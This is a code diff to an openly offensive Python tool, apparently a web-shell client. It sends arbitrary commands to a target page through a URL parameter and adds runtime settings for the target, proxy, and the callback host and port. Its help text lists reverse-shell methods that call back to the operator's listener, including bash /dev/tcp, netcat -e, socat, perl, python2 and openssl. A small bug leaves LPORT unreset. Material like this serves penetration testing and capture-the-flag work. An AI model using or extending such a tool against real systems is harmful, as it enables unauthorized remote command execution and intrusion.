@@ -29,7 +29,7 @@ def invoke_command(url, invoke_word, cmd, proxy_string=""):
         # This assumes the string is something like
         # http://localhost:8080
         try:
-            protocol = split(":", 1)
+            protocol = proxy_string.split(":", 1)
             proxies = {protocol[0]: proxy_string}
 
         except ValueError:
@@ -44,7 +44,10 @@ def invoke_command(url, invoke_word, cmd, proxy_string=""):
     wrapped_command = f"echo -n {prefix}; {cmd} ; echo -n {suffix}"
     payload = { invoke_word: wrapped_command }
     if len(proxy_string):
-        r = requests.get(url, params=payload, proxies=proxies)
+        try:
+            r = requests.get(url, params=payload, proxies=proxies)
+        except requests.exceptions.ProxyError:
+            return f"PROXY ERROR! Is there a proxy listening on {proxy_string}?"
     else:
         r = requests.get(url, params=payload)
     if prefix in r.text:
@@ -101,17 +104,102 @@ class Terminal(cmd.Cmd):
             print(output)
     
     def do_exit(self, args):
+        """
+        Exits the program.
+        """
         print("Exiting.")
         sys.exit(0)
+    
+    def do_shellset(self, args):
+        """
+        Sets options during runtime, so you can change settings without having to
+        exit the program.
+
+        usage:  shellset proxy http://localhost:8080
+                shellset lhost 10.10.14.21
+        
+        options:
+                proxy <proxy_string>
+                Use a proxy. Expected input: http://<ip_or_host>:<port>
+            
+                lhost <ip_address>|<hostname>
+                Set your local IP or hostname for reverse shell callbacks.
+
+                lport <port>
+                Set your local port your listener will communicate on.
+
+                invokeword <word>
+                Change the invoke word. This is the word that this program will use
+                to send arbitrary commands to. IE: target.php?cmd=id, where the invoke
+                word here is "cmd"
+
+                target <url>
+                Change the target URL. This should be a full URL pointing to the page
+                that has the exploitable code on it. IE: http://example.com/pwned.php
+
+                unset <proxy|lhost|lport|invokeword>
+                Unsets the value for proxy/lhost/lport/invokeword. Note, target cannot
+                be unset! Where else would we send our malicious intent?
+        """
+        # cases like this I really wish python had a switch statement...
+        # what a mess this is.
+        #valid_options = ("proxy", "lhost", "lport", "invokeword", "target")
+        try:
+            config, value = args.split(" ")
+            if config == "proxy":
+                self.proxy_string = value
+                print(f"Set new proxy: {self.proxy_string}")
+            elif config == "lhost":
+                self.lhost = value
+                print(f"Set new LHOST: {self.lhost}")
+            elif config == "lport":
+                self.lport = value
+                print(f"Set new LPORT: {self.lport}")
+            elif config == "invokeword":
+                self.invoke_word = value
+                print(f"Set new Invoke Word: {self.invoke_word}")
+            elif config == "target":
+                self.target = value
+                print(f"Set new target URL: {self.target}")
+            elif config == "unset":
+                if value == "proxy":
+                    self.proxy_string = ""
+                    print("Successfully unset proxy")
+                elif value == "lhost":
+                    self.lhost = "127.0.0.1"
+                    print(f"Successfully unset LHOST, reset to default of {self.lhost}")
+                elif value == "lport":
+                    self.lport == 9090
+                    print(f"Successfully unset LPORT, reset to default of {self.lport}.")
+                elif value == "invokeword":
+                    self.invoke_word = "cmd"
+                    print(f"Successfully unset invoke word, reset to default of {self.invoke_word}.")
+                elif value == "target":
+                    print("Cannot unset target! Change this value instead!")
+                else:
+                    print("Invalid setting")
+            else:
+                print(f"Unknown config: {config}!")
+        except ValueError:
+            print("Invalid usage! See shellset help:")
+            self.do_help("shellset")
 
     def do_shellup(self, shelltype):
         """
         Will issue a reverse callback using common binaries on the remote system.
-        To determine types, type "shellup" without arguments. This will print the
-        list of shellup methods we can use. To issue a shellup callback with bash
-        as an example, use:
+        To issue a shellup callback with bash as an example, use:
 
         shellup bash
+
+        Available shellup types:
+
+        bash -- uses /dev/tcp to connect back. Use nc -lvnp to communicate
+        evilnc -- attempts to use netcat with -e flag compiled in, this is rare but useful if it works
+        nc -- uses backpipes to connect back. Useful if netcat is installed on the system but not compiled with -e flag
+        socat -- uses socat to revsere back. Will need a socat listener to work.
+        perl -- uses perl to connect back. Use nc -lvnp to communicate.
+        python2 -- uses python2 to connect back. Use nc -lvnp to communicate.
+        openssl -- uses openssl to create a secure reverse shell. Needs openssl client-side to communicate.
         """
         shelltypes = ('bash', 'evilnc', 'nc', 'socat', 'perl', 'python2', 'openssl',)
         if shelltype in shelltypes:
